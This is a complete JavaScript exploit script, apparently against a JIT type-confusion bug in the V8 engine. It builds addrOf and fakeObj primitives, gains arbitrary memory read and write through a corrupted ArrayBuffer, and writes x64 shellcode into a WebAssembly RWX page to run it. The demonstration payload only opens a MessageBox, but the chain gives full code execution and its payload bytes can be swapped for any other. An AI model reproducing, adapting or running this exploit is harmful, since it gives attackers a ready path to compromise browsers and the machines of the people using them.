let floatVIew = new Float64Array(1);
let uint64View = new BigUint64Array(floatVIew.buffer);
Number.prototype.toBigInt = function () {
    floatVIew[0] = this;
    return uint64View[0];
};
BigInt.prototype.toNumber = function () {
    uint64View[0] = this;
    return floatVIew[0];
};

function makeObj(propertiesValue) {
    let obj = { inline: 0x12 };
    for (let i = 0; i < 32; ++i) {
        Object.defineProperty(obj, "p" + i, {
            writable: true,
            value: propertiesValue[i]
        });
    }
    return obj;
}

function findOverlappingProperties() {
    let propertiesName = [];
    for (let i = 0; i < 32; ++i)
        propertiesName[i] = "p" + i;

    eval(`
        function vuln(obj)
        {
            obj.inline;
            this.Object.create(obj);
            ${propertiesName.map((p) => `let ${p} = obj.${p}`).join('\n')};
            return [${propertiesName.join(", ")}];
        }
    `);

    let propertiesValue = [];
    for (let i = 1; i < 32; ++i)
        propertiesValue[i] = -i;

    for (let i = 0; i < 10000; ++i) {
        let res = vuln(makeObj(propertiesValue));
        for (let i = 0; i < res.length; ++i) {
            if (i !== -res[i] && res[i] < 0 && res[i] > -32)
                return [i, -res[i]];
        }
    }

    throw "[!] Failed to find overlapping properties";
}

function addrOf(target) {
    eval(`
        function vuln(obj)
        {
            obj.inline;
            this.Object.create(obj);
            return obj.p${p1}.x1;
        }
    `);

    let propertiesValue = [];
    propertiesValue[p1] = { x1: 13.37, x2: 13.38 };
    propertiesValue[p2] = { y: target };
    for (let i = 0; i < 10000; ++i) {

        let res = vuln(makeObj(propertiesValue));
        if (res != 13.37)
            return res.toBigInt() - 1n;
    }
}

function fakeObj(target, newValue) {
    eval(`
        function vuln(obj)
        {
            obj.inline;
            this.Object.create(obj);
            let origin = obj.p${p1}.x2;
            obj.p${p1}.x2 = ${newValue.toNumber()};
            return origin;
        }`
    );

    let propertiesValue = [];
    let o = { x1: 13.37, x2: 13.38 };
    propertiesValue[p1] = o;
    propertiesValue[p2] = target;
    for (let i = 0; i < 10000; ++i) {
        o.x2 = 13.38;
        let res = vuln(makeObj(propertiesValue));
        if (res != 13.38)
            return res.toBigInt();
    }

    throw "[!] fakeObj Primitive Failed";
}

let p1, p2;
function exploit() {
    print("[+] Finding Overlapping Properties...");
    [p1, p2] = findOverlappingProperties();
    print(`[+] Properties p${p1} and p${p2} overlap!`);

    let arrBufFront = new ArrayBuffer(1024);
    let arrBufBack = new ArrayBuffer(1024);

    print("[+] Leaking ArrayBuffer Address...");
    let arrBufFrontfAddr = addrOf(arrBufBack);
    print(`[+] ArrayBuffer Address: 0x${arrBufFrontfAddr.toString(16)}`);

    print("[+] Corrupting ArrayBuffer Backing Store Address...")
    let originalArrBuf1BackingStore = fakeObj(arrBufFront, arrBufFrontfAddr);

    let viewFront = new BigUint64Array(arrBufFront);
    let originalArrBufBackBackingStore = viewFront[4];

    let memory = {
        read64(addr) {
            viewFront[4] = addr;
            let viewBack = new BigUint64Array(arrBufBack);
            return viewBack[0];
        },

        write64(addr, value) {
            viewFront[4] = addr;
            let viewBack = new BigUint64Array(arrBufBack);
            viewBack[0] = value;
        },

        write(addr, bytes) {
            viewFront[4] = addr;
            let viewBack = new Uint8Array(arrBufBack);
            viewBack.set(bytes);
        },

        addrOf(target) {
            arrBufBack.leakMe = target;
            let propertiesOfArrBufBackAddr = this.read64(arrBufFrontfAddr + 0x8n) - 0x1n;
            return this.read64(propertiesOfArrBufBackAddr + 0x10n) - 0x1n;
        }
    }
    print("[+] Constructed Memory Read and Write Primitive!");

    memory.write64(originalArrBufBackBackingStore, 0x41414141n);
    
    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    
    let wasmInstanceAddr = memory.addrOf(wasmInstance);
    print(`[+] WASM Instance Address: 0x${wasmInstanceAddr.toString(16)}`);
    
    let wasmRWXAddr = memory.read64(wasmInstanceAddr + 0xf0n);
    print(`[+] WASM RWX Page Address: 0x${wasmRWXAddr.toString(16)}`);
    
    // shellcode : https://gist.github.com/kkent030315/b508e56a5cb0e3577908484fa4978f12
    let shellcode = new Uint8Array([0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x8D, 0x15, 0x66, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x52, 0x00, 0x00, 0x00, 0xE8, 0x9E, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xF8, 0x48, 0x8D, 0x0D, 0x5D, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8D, 0x15, 0x5F, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x4D, 0x00, 0x00, 0x00, 0xE8, 0x7F, 0x00, 0x00, 0x00, 0x4D, 0x33, 0xC9, 0x4C, 0x8D, 0x05, 0x61, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x4E, 0x00, 0x00, 0x00, 0x48, 0x33, 0xC9, 0xFF, 0xD0, 0x48, 0x8D, 0x15, 0x56, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0xE8, 0x56, 0x00, 0x00, 0x00, 0x48, 0x33, 0xC9, 0xFF, 0xD0, 0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32, 0x2E, 0x44, 0x4C, 0x4C, 0x00, 0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x00, 0x55, 0x53, 0x45, 0x52, 0x33, 0x32, 0x2E, 0x44, 0x4C, 0x4C, 0x00, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x00, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x45, 0x78, 0x69, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x4C, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x40, 0x18, 0x4D, 0x8D, 0x60, 0x10, 0x4D, 0x8B, 0x04, 0x24, 0xFC, 0x49, 0x8B, 0x78, 0x60, 0x48, 0x8B, 0xF1, 0xAC, 0x84, 0xC0, 0x74, 0x26, 0x8A, 0x27, 0x80, 0xFC, 0x61, 0x7C, 0x03, 0x80, 0xEC, 0x20, 0x3A, 0xE0, 0x75, 0x08, 0x48, 0xFF, 0xC7, 0x48, 0xFF, 0xC7, 0xEB, 0xE5, 0x4D, 0x8B, 0x00, 0x4D, 0x3B, 0xC4, 0x75, 0xD6, 0x48, 0x33, 0xC0, 0xE9, 0xA7, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x58, 0x30, 0x44, 0x8B, 0x4B, 0x3C, 0x4C, 0x03, 0xCB, 0x49, 0x81, 0xC1, 0x88, 0x00, 0x00, 0x00, 0x45, 0x8B, 0x29, 0x4D, 0x85, 0xED, 0x75, 0x08, 0x48, 0x33, 0xC0, 0xE9, 0x85, 0x00, 0x00, 0x00, 0x4E, 0x8D, 0x04, 0x2B, 0x45, 0x8B, 0x71, 0x04, 0x4D, 0x03, 0xF5, 0x41, 0x8B, 0x48, 0x18, 0x45, 0x8B, 0x50, 0x20, 0x4C, 0x03, 0xD3, 0xFF, 0xC9, 0x4D, 0x8D, 0x0C, 0x8A, 0x41, 0x8B, 0x39, 0x48, 0x03, 0xFB, 0x48, 0x8B, 0xF2, 0xA6, 0x75, 0x08, 0x8A, 0x06, 0x84, 0xC0, 0x74, 0x09, 0xEB, 0xF5, 0xE2, 0xE6, 0x48, 0x33, 0xC0, 0xEB, 0x4E, 0x45, 0x8B, 0x48, 0x24, 0x4C, 0x03, 0xCB, 0x66, 0x41, 0x8B, 0x0C, 0x49, 0x45, 0x8B, 0x48, 0x1C, 0x4C, 0x03, 0xCB, 0x41, 0x8B, 0x04, 0x89, 0x49, 0x3B, 0xC5, 0x7C, 0x2F, 0x49, 0x3B, 0xC6, 0x73, 0x2A, 0x48, 0x8D, 0x34, 0x18, 0x48, 0x8D, 0x7C, 0x24, 0x30, 0x4C, 0x8B, 0xE7, 0xA4, 0x80, 0x3E, 0x2E, 0x75, 0xFA, 0xA4, 0xC7, 0x07, 0x44, 0x4C, 0x4C, 0x00, 0x49, 0x8B, 0xCC, 0x41, 0xFF, 0xD7, 0x49, 0x8B, 0xCC, 0x48, 0x8B, 0xD6, 0xE9, 0x14, 0xFF, 0xFF, 0xFF, 0x48, 0x03, 0xC3, 0x48, 0x83, 0xC4, 0x28, 0xC3]);
    memory.write(wasmRWXAddr, shellcode);

    print("[+] Popping MessageBox...");

    func();
}

if(typeof module == 'undefined')
{
    exploit();
}